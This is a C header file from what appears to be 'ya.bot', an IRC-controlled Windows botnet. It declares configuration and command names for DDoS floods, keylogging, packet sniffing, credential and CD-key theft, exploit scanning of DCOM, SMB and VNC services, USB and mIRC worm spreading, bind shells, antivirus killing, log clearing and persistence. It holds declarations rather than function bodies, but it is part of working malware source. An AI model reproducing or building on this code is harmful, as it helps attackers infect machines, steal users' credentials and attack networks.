/*  ya.bot  */

extern const int xorkey;

extern const char *botid;
extern const char *botnick;
extern const bool botnickextended;
extern const char *commandprefix;
extern const char *versionreply;
extern const int botnickmaxrandom;

extern const DWORD botpassword;
extern const char *hostauth[];
extern const bool cryptedcommuncation;

typedef struct SUserList
{
	DWORD m_dwUserName;
	DWORD m_dwUserPassword;
	char *m_pszHostAuth;
	bool m_bCryptedCommuncation;
	int m_nLevel;
} SUserList;
extern struct SUserList rgSUserList[];

extern const char *botfilename;
extern const char *botstartupname;
extern const bool botinstallasservice;
extern const char *driverfilename;
extern const char *driverservicename;
extern const char *wormridefilename;

typedef struct SServerList
{
	char *m_pszServer;
	int m_nPort;
	char *m_pszServerPassword;
	char *m_pszBotChannel;
	char *m_pszBotChannelKey;
	char *m_pszExploitChannel;
	char *m_pszKeyLogChannel;
	char *m_pszPSniffChannel;
	int m_nConnectionTimeOut;
	int m_nHammerTimeOut;
	int m_nPingTimeOut;
} SServerList;
extern struct SServerList rgSServerList[];

extern const int daemonftpport;
extern const char *daemonftpuser;
extern const char *daemonftppass;
extern const char *daemonhttpfilename;
extern const int daemonhttpport;

extern const char *debuglogfilename;
extern const char *badipsandhosts[];


extern const char *cmd_botlogin;
extern const char *cmd_botdie;
extern const char *cmd_botdisconnect;
extern const char *cmd_botdns;
extern const char *cmd_botinfo;
extern const char *cmd_botlogout;
extern const char *cmd_botraw;
extern const char *cmd_botremove;
extern const char *cmd_botsystem;

#ifndef NO_DCC
extern const char *cmd_dccsend;
extern const char *cmd_dccstop;
#endif

extern const char *cmd_filedelete;
#ifndef NO_FILEFIND
extern const char *cmd_filefind;
#endif
extern const char *cmd_fileopen;

#ifndef NO_FTP
extern const char *cmd_ftpdownload;
extern const char *cmd_ftpupdate;
extern const char *cmd_ftpupload;
#endif

#ifndef NO_HTTP
extern const char *cmd_httpdownload;
extern const char *cmd_httpupdate;
extern const char *cmd_httpvisit;
#endif

#ifndef NO_INFO
extern const char *cmd_infonet;
extern const char *cmd_infosys;
#endif

#ifndef NO_KEYLOG
extern const char *cmd_keylogsign;
extern const char *cmd_keylogstart;
extern const char *cmd_keylogstop;
#endif

#ifndef NO_LOGIC
extern const char *cmd_logicif;
#endif

extern const char *cmd_processkillpid;
extern const char *cmd_processlist;
extern const char *cmd_processtart;

#ifndef NO_PSNIFF
extern const char *cmd_psniffstart;
extern const char *cmd_psniffstop;
#endif

#ifndef NO_SPEEDTEST
extern const char *cmd_speedtesthttp;
#endif

extern const char *cmd_threadkill;
extern const char *cmd_threadlist;

#ifndef NO_DAEMONSOCKS4
extern const char *cmd_socks4dstart;
extern const char *cmd_socks4dstop;
#endif

#ifndef NO_BANDWITHFLOOD
extern const char *cmd_ddosbandwith;
#endif
extern const char *cmd_ddosstop;
#ifndef NO_SYNACKFLOOD
extern const char *cmd_ddossynack;
#endif
#ifndef NO_TROLLFLOOD
extern const char *cmd_ddostroll;
#endif
#ifndef NO_UDPKFLOOD
extern const char *cmd_ddosudp;
#endif

#ifndef NO_BOTKILLER
extern const char *cmd_botkillerstart;
extern const char *cmd_botkillerstop;
#endif

#ifndef NO_EXPSCAN
extern const char *cmd_expscancip;
extern const char *cmd_expscanstart;
extern const char *cmd_expscanstop;
#endif
#ifndef NO_MIRCSCAN
extern const char *cmd_mircscanstart;
extern const char *cmd_mircscanstop;
#endif
#ifndef NO_USBSCAN
extern const char *cmd_usbscanstart;
extern const char *cmd_usbscanstop;
#endif
extern const char *cmd_scanstats;

extern const char *cmd_snagall;
#ifndef NO_SNAGCDKEYS
extern const char *cmd_snagcdkeys;
#endif
#ifndef NO_SNAGCLIPBOARD
extern const char *cmd_snagclipboard;
#endif
#ifndef NO_SNAGEMAILS
extern const char *cmd_snagemails;
#endif
#ifndef NO_SNAGMSN
extern const char *cmd_snagmsn;
#endif
#ifndef NO_SNAGSTORAGE
extern const char *cmd_snagstorage;
#endif

#ifndef NO_INSTALLWORMRIDE
extern const char *cmd_wormridestart;
extern const char *cmd_wormridestop;
#endif


#ifndef NO_DEBUG
extern const char *string_debugdate;
extern const char *string_debugtime;
extern const char *string_debugprint;
extern const char *string_debugfileappend;
#endif

extern const char *string_mainmutex;

extern const char *string_installregistrystartup;
extern const char *string_installregistrysafebootminimal;
extern const char *string_installregistrysafebootnetwork;
extern const char *string_installresourcetype;
extern const char *string_installmeltcommand;
extern const char *string_installmeltcomspec;

#ifndef NO_INSTALLDRIVER
extern const char *string_installdriverresourcename;
#endif

#ifndef NO_INSTALLWORMRIDE
extern const char *string_installwormrideresourcename;
extern const char *string_wormridealreadyrunning;
extern const char *string_wormridefailed;
extern const char *string_wormridestarted;
extern const char *string_wormridefinished;
extern const char *string_wormridestopped;
extern const char *string_wormridenotrunning;
#endif

extern const char *string_ircaction;
extern const char *string_ircmessage;
extern const char *string_ircnicknumber;
extern const char *string_ircnicklan;
extern const char *string_ircnickmodem;
extern const char *string_ircnickdirect;
extern const char *string_ircnicknt;
extern const char *string_ircnick2k;
extern const char *string_ircnick03;
extern const char *string_ircnickvs;
extern const char *string_ircnickquestionmarks;
extern const char *string_ircnickextended;
extern const char *string_ircnickgood;
extern const char *string_ircnickuptime;
extern const char *string_ircuserinfo;
extern const char *string_ircjoin;
extern const char *string_ircpingserver;
extern const char *string_ircping;
extern const char *string_ircpong;
extern const char *string_ircmotd;
extern const char *string_ircnomotd;
extern const char *string_ircnickinuse;
extern const char *string_ircnotregistered;
extern const char *string_ircbannedfromchannel;
extern const char *string_ircwrongchannelkey;
extern const char *string_irctopicset;
extern const char *string_irckick;
extern const char *string_ircpart;
extern const char *string_ircquit;
extern const char *string_ircnotice;
extern const char *string_ircprivmsg;
extern const char *string_ircclientping;
extern const char *string_ircclientpong;
extern const char *string_ircclientversion;
extern const char *string_ircclientversionresponse;
extern const char *string_ircdelayresponse;
extern const char *string_ircsilentresponse;
extern const char *string_ircverboseresponse;

#ifndef NO_TOPIC
extern const char *string_irctopiccommand;
extern const char *string_ircmutlitopicseperator;
extern const char *string_ircmutlitopiccommand;
#endif

extern const char *string_threadbotmain;
extern const char *string_threadircping;
#ifndef NO_ANTIDEBUG
extern const char *string_threadantidebugdetectdebugger;
#endif
#ifndef NO_DCC
extern const char *string_threaddccget;
extern const char *string_threaddccsend;
#endif
#ifndef NO_FILEFIND
extern const char *string_threadfilefindmain;
#endif
#ifndef NO_FTP
extern const char *string_threadftpdownload;
extern const char *string_threadftpupdate;
extern const char *string_threadftpupload;
#endif
#ifndef NO_HTTP
extern const char *string_threadhttpdownload;
extern const char *string_threadhttpupdate;
#endif
#ifndef NO_KEYLOG
extern const char *string_threadkeylogmain;
#endif
#ifndef NO_PSNIFF
extern const char *string_threadpsniffmain;
#endif
#ifndef NO_SECURE
extern const char *string_threadsecuremain;
#endif
#ifndef NO_DAEMONFTP
extern const char *string_threaddaemonftpmain;
#endif
#ifndef NO_DAEMONHTTP
extern const char *string_threaddaemonhttpmain;
#endif
#ifndef NO_DAEMONIDENT
extern const char *string_threaddaemonidentmain;
#endif
#ifndef NO_DAEMONSOCKS4
extern const char *string_threaddaemonsocks4main;
#endif
#ifndef NO_BANDWITHFLOOD
extern const char *string_threadbandwithfloodmain;
#endif
#ifndef NO_SYNACKFLOOD
extern const char *string_threadsynackfloodmain;
#endif
#ifndef NO_TROLLFLOOD
extern const char *string_threadtrollfloodmain;
#endif
#ifndef NO_UDPFLOOD
extern const char *string_threadudpfloodmain;
#endif
#ifndef NO_AVKILLER
extern const char *string_threadavkillermain;
#endif
#ifndef NO_BOTKILLER
extern const char *string_threadbotkillermain;
#endif
#ifndef NO_EXPSCAN
extern const char *string_threadexpscanmain;
#endif
#ifndef NO_MIRCSCAN
extern const char *string_threadmircscanmain;
#endif
#ifndef NO_USBSCAN
extern const char *string_threadusbscanmain;
#endif
#ifndef NO_INSTALLWORMRIDE
extern const char *string_threadwormridemain;
#endif

extern const char *string_replymain;
extern const char *string_replyfile;
#ifndef NO_DCC
extern const char *string_replydcc;
#endif
#ifndef NO_FTP
extern const char *string_replyftp;
#endif
#ifndef NO_HTTP
extern const char *string_replyhttp;
#endif
#ifndef NO_INFO
extern const char *string_replyinfo;
#endif
#ifndef NO_KEYLOG
extern const char *string_replykeylog;
#endif
extern const char *string_replyprocess;
#ifndef NO_PSNIFF
extern const char *string_replypsniff;
#endif
#ifndef NO_SPEEDTEST
extern const char *string_replyspeedtest;
#endif
extern const char *string_replythread;
#ifndef NO_DAEMONFTP
extern const char *string_replyftpd;
#endif
#ifndef NO_DAEMONHTTP
extern const char *string_replyhttpd;
#endif
#ifndef NO_DAEMONSOCKS4
extern const char *string_replysocks4d;
#endif
extern const char *string_replyddos;
#ifndef NO_BOTKILLER
extern const char *string_replybotkiller;
#endif
#ifndef NO_EXPSCAN
extern const char *string_replyexpscan;
extern const char *string_replytransfer;
#endif
#ifndef NO_MIRCSCAN
extern const char *string_replymircscan;
#endif
#ifndef NO_USBSCAN
extern const char *string_replyusbscan;
#endif
extern const char *string_replyscan;
extern const char *string_replysnag;
#ifndef NO_INSTALLWORMRIDE
extern const char *string_replywormride;
#endif
extern const char *string_replydotbot;

extern const char *string_botquitmsg;
extern const char *string_botloggedin;
extern const char *string_botloggedout;
extern const char *string_botdnsresolved;
extern const char *string_botdnsfailed;
extern const char *string_botinfo;
extern const char *string_botremovingbot;
extern const char *string_botremovefailed;
extern const char *string_botsystemcommand;

extern const char *string_user32library;
#ifndef NO_ANTIDEBUG
extern const char *string_antidebugmessageboxafunction;
extern const char *string_antidebugsofticepath;
#endif

#ifndef NO_DCC
extern const char *string_dccrequest;
extern const char *string_dccsend;
extern const char *string_dccalreadyrunning;
extern const char *string_dccparameters;
extern const char *string_dccstarted;
extern const char *string_dccfailed;
extern const char *string_dccfinished;
extern const char *string_dccstopped;
extern const char *string_dccnotrunning;
#endif

extern const char *string_filefopenreadbinary;
extern const char *string_filefopenreadwritebinary;
extern const char *string_filefopenwritebinary;
extern const char *string_filepath;
extern const char *string_fileopen;
extern const char *string_filedeleted;
extern const char *string_fileunabletodelete;
#ifndef NO_FILEFIND
extern const char *string_filesearchingforfile;
extern const char *string_filefinddirectory;
extern const char *string_filefoundfile;
extern const char *string_fileendofsearch;
extern const char *string_filealreadysearchingforfile;
#endif
extern const char *string_fileopened;
extern const char *string_fileunabletoopen;

#ifndef NO_FTP
extern const char *string_ftpupdatefile;
extern const char *string_ftpretr;
extern const char *string_ftpstor;
extern const char *string_ftpretrievedfile;
extern const char *string_ftpretrievedupdate;
extern const char *string_ftpstoredfile;
extern const char *string_ftpunabletoretrieve;
extern const char *string_ftpunabletostore;
extern const char *string_ftpalreadytransferringfile;
#endif

#ifndef NO_HTTP
extern const char *string_httpupdatefile;
extern const char *string_httpdownloading;
extern const char *string_httpdownloadedfile;
extern const char *string_httpdownloadedupdate;
extern const char *string_httpunabletodownload;
extern const char *string_httpalreadydownloadingfile;
extern const char *string_httpagent;
extern const char *string_httpvisited;
extern const char *string_httpunabletovisit;
#endif

extern const char *string_infoquestionmarks;
extern const char *string_infowindowsxp;
#ifndef NO_INFO
extern const char *string_infonet;
extern const char *string_infowindowsbuild;
extern const char *string_infowindowsnt;
extern const char *string_infowindows2000;
extern const char *string_infowindows2003;
extern const char *string_infowindowsvista;
extern const char *string_infoinfecteddate;
extern const char *string_infoinfectedsubkey;
extern const char *string_infoinfectedvaluename;
extern const char *string_infosys;
#endif

extern const char *string_kernel32library;

extern const char *string_injectfreelibraryfunction;
extern const char *string_injectloadlibraryfunction;

#ifndef NO_KEYLOG
extern const char *string_keylogalreadyrunning;
extern const char *string_keylogfailed;
extern const char *string_keylogstarted;
extern const char *string_keylogsignaturestarted;
extern const char *string_keylogcaption;
extern const char *string_keyloglog;
extern const char *string_keylogsignature;
extern const char *string_keylogstopped;
extern const char *string_keylognotrunning;
#endif

#ifndef NO_LOGIC
extern const char *string_logiccpu;
extern const char *string_logicdisk;
extern const char *string_logichost;
extern const char *string_logicid;
extern const char *string_logicip;
extern const char *string_logicnick;
extern const char *string_logicram;
extern const char *string_logicuptime;
extern const char *string_logiccommand;
#endif

#ifndef NO_CLEARLOGS
extern const char *string_miscclearlogapplication;
extern const char *string_miscclearlogsecurity;
extern const char *string_miscclearlogsystem;
#endif
extern const char *string_miscdebugprivilege;
extern const char *string_miscshutdownprivilege;
extern const char *string_miscurlmonlibrary;
extern const char *string_miscurldownloadfunction;

extern const char *string_netutilsfpchar;
extern const char *string_netutilsfpwinnt;
extern const char *string_netutilsfpwin2000;
extern const char *string_netutilsfpwinxp;
extern const char *string_netutilsfpwin2003;
extern const char *string_netutilsfpwinvista;
extern const char *string_netutilsipgetsockip;
extern const char *string_netutilsipprivateclassa;
extern const char *string_netutilsipprivateclassb;
extern const char *string_netutilsipprivateclassc;
extern const char *string_netutilsnullsessionipc;

#ifndef NO_PATCH
extern const char *string_patchsfcoslibrary;
extern const char *string_patchsleepfunction;
extern const char *string_patchtcpipfile;
#endif

#ifndef NO_PERSIST
extern const char *string_persistclosehandle;
extern const char *string_persistcreatefilea;
extern const char *string_persistcreatemutexa;
extern const char *string_persistgetlasterror;
extern const char *string_persistreleasemutex;
extern const char *string_persistsleep;
extern const char *string_persistwinexec;
extern const char *string_persistclassname;
#endif

extern const char *string_processkilled;
extern const char *string_processunabletokill;
extern const char *string_processlistingprocesses;
extern const char *string_processlistfailed;
extern const char *string_processlistprocess;
extern const char *string_processendofprocesslist;
extern const char *string_processtarted;
extern const char *string_processunabletostart;

#ifndef NO_PSNIFF
extern const char *string_psniffalreadyrunning;
extern const char *string_psniffailed;
extern const char *string_psniffstarted;
extern const char *string_psniffpacket;
extern const char *string_psniffstopped;
extern const char *string_psniffnotrunning;
#endif

#ifndef NO_RING0
extern const char *string_ring0ntdlllibrary;
extern const char *string_ring0keservicedescriptortablefunction;
extern const char *string_ring0psinitialsystemprocessfunction;
#endif

#ifndef NO_SECURE
extern const char *string_securenonullsessionsubkey;
extern const char *string_securenonullsessionvaluename;
extern const char *string_securenodcomsubkey;
extern const char *string_securenodcomvaluename;
extern const char *string_securenonetbtsubkey;
extern const char *string_securenonetbtvaluename;
#endif

#ifndef NO_SPEEDTEST
extern const char *string_speedtestgettinghttpspeed;
extern const char *string_speedtesthttprequest;
extern const char *string_speedtesthttpspeedtest;
#endif

extern const char *string_threadkilled;
extern const char *string_threadunabletokill;
extern const char *string_threadlistingthreads;
extern const char *string_threadlistthread;
extern const char *string_threadendofthreadlist;

#ifndef NO_CRYPTOSHA256
extern const char *string_sha256char;
#endif

extern const char *string_setip;

#ifndef NO_DAEMONFTP
extern const char *string_daemonftp220;
extern const char *string_daemonftpuser;
extern const char *string_daemonftp331;
extern const char *string_daemonftppass;
extern const char *string_daemonftp230;
extern const char *string_daemonftpport;
extern const char *string_daemonftpportinfo;
extern const char *string_daemonftp200;
extern const char *string_daemonftpretr;
extern const char *string_daemonftp150;
extern const char *string_daemonftp226;
extern const char *string_daemonftp425;
extern const char *string_daemonftp221;
extern const char *string_daemonftptransferstarted;
extern const char *string_daemonftptransferfinished;
extern const char *string_daemonftptransferfailed;
#endif
#ifndef NO_DAEMONHTTP
extern const char *string_daemonhttprequest;
extern const char *string_daemonhttpheader;
extern const char *string_daemonhttptransferstarted;
extern const char *string_daemonhttptransferfinished;
extern const char *string_daemonhttptransferfailed;
#endif
#ifndef NO_DAEMONIDENT
extern const char *string_daemonidentmsg;
#endif
#ifndef NO_DAEMONSOCKS4
extern const char *string_daemonsocks4alreadyrunning;
extern const char *string_daemonsocks4started;
extern const char *string_daemonsocks4stopped;
extern const char *string_daemonsocks4notrunning;
#endif

extern const char *string_ddosalreadyrunning;
extern const char *string_ddosfailed;
#ifndef NO_BANDWITHFLOOD
extern const char *string_ddosbandwithfloodstarted;
extern const char *string_ddosbandwithfloodfilename;
#endif
#ifndef NO_SYNACKFLOOD
extern const char *string_ddossynackfloodstarted;
#endif
#ifndef NO_TROLLFLOOD
extern const char *string_ddostrollfloodstarted;
#endif
#ifndef NO_UDPFLOOD
extern const char *string_ddosudpfloodstarted;
#endif
extern const char *string_ddosfinishedflooding;
extern const char *string_ddosstopped;
extern const char *string_ddosnotrunning;

#ifndef NO_BOTKILLER
extern const char *string_botkilleralreadyrunning;
extern const char *string_botkillerfailed;
extern const char *string_botkillerstarted;
extern const char *string_botkillerkilledprocess;
extern const char *string_botkillerdeletedfile;
extern const char *string_botkillerdeletedregistryentry;
extern const char *string_botkillerfinished;
extern const char *string_botkillerstopped;
extern const char *string_botkillernotrunning;
#endif

#ifndef NO_EXPSCAN
extern const char *string_expscanparametera;
extern const char *string_expscanparameterb;
extern const char *string_expscanparameterc;
extern const char *string_expscanparameterr;
extern const char *string_expscannullip;
extern const char *string_expscancurrentlyscanning;
extern const char *string_expscanalreadyrunning;
extern const char *string_expscaninvalidipport;
extern const char *string_expscansequentialscanstarted;
extern const char *string_expscanrandomscanstarted;
extern const char *string_expscanopenport;
extern const char *string_expscanfinished;
extern const char *string_expscanstopped;
extern const char *string_expscannotrunning;
extern const char *string_transferfailedtoconnect;
extern const char *string_transferstarted;
extern const char *string_transferfailed;
extern const char *string_transferfinished;
extern const char *string_bindshellcmd;
extern const char *string_bindshellstart1;
extern const char *string_bindshellstart2;
#ifndef NO_EXPSCANDCOM
extern const char *string_expscandcomepmapper;
#endif
#ifndef NO_EXPSCANFTP
extern const char *string_expscanftpdaemonfound;
#endif
extern const char *string_expscansmbmachine;
#ifndef NO_EXPSCANSMB
extern const char *string_expscansmbshare;
#endif
#ifndef NO_EXPSCANSMTP
extern const char *string_expscansmtpdaemonfound;
#endif
#ifndef NO_EXPSCANREALVNC
extern const char *string_expscanrealvncfound;
#endif
#endif
#ifndef NO_MIRCSCAN
extern const char *string_mircscanalreadyrunning;
extern const char *string_mircscanstarted;
extern const char *string_mircscanamsg;
extern const char *string_mircscanmirc;
extern const char *string_mircscanfinished;
extern const char *string_mircscanstopped;
extern const char *string_mircscannotrunning;
#endif
#ifndef NO_USBSCAN
extern const char *string_usbscanalreadyrunning;
extern const char *string_usbscanstarted;
extern const char *string_usbscanfloppy;
extern const char *string_usbscancopyfailed;
extern const char *string_usbscancopysuccessful;
extern const char *string_usbscanfinished;
extern const char *string_usbscanstopped;
extern const char *string_usbscannotrunning;
#endif
extern const char *string_scanstats;

#ifndef NO_SNAGCDKEYS
extern const char *string_snagcdkeysgettingcdkeys;
extern const char *string_snagcdkeyscdkey;
extern const char *string_snagcdkeyswincdkeydigits;
extern const char *string_snagcdkeyswincdkeyregistrypath;
extern const char *string_snagcdkeyswincdkeyregistryvalue;
extern const char *string_snagcdkeyswincdkeycdkey;
#endif
#ifndef NO_SNAGCLIPBOARD
extern const char *string_snagclipboardgettingclipboarddata;
extern const char *string_snagclipboarddata;
#endif
#ifndef NO_SNAGEMAILS
extern const char *string_snagemailswabregistrykey;
extern const char *string_snagemailsgettingemails;
extern const char *string_snagemailsfailedtopenwabfile;
extern const char *string_snagemailsemail;
#endif
#ifndef NO_SNAGMSN
extern const char *string_snagmsnseed;
extern const char *string_snagmsncryptdatalibrary;
extern const char *string_snagmsncredentiallibrary;
extern const char *string_snagmsncryptunprotecteddatafunction;
extern const char *string_snagmsncredenumeratefunction;
extern const char *string_snagmsncredreadfunction;
extern const char *string_snagmsncredfreefunction;
extern const char *string_snagmsnpassportnet;
extern const char *string_snagmsngettingcredentials;
extern const char *string_snagmsncredentialfailed;
extern const char *string_snagmsncredentialinfo;
#endif
#ifndef NO_SNAGSTORAGE
extern const char *string_snagstoragepstorelibrary;
extern const char *string_snagstoragepstorefunction;
extern const char *string_snagstoragegettingpasswordstoragedata;
extern const char *string_snagstoragefailedtoloadpstoreclibrary;
extern const char *string_snagstoragemainguid;
extern const char *string_snagstoragesubguid;
extern const char *string_snagstorageitem;
extern const char *string_snagstoragedata;
#endif
extern const char *string_snagendofsnag;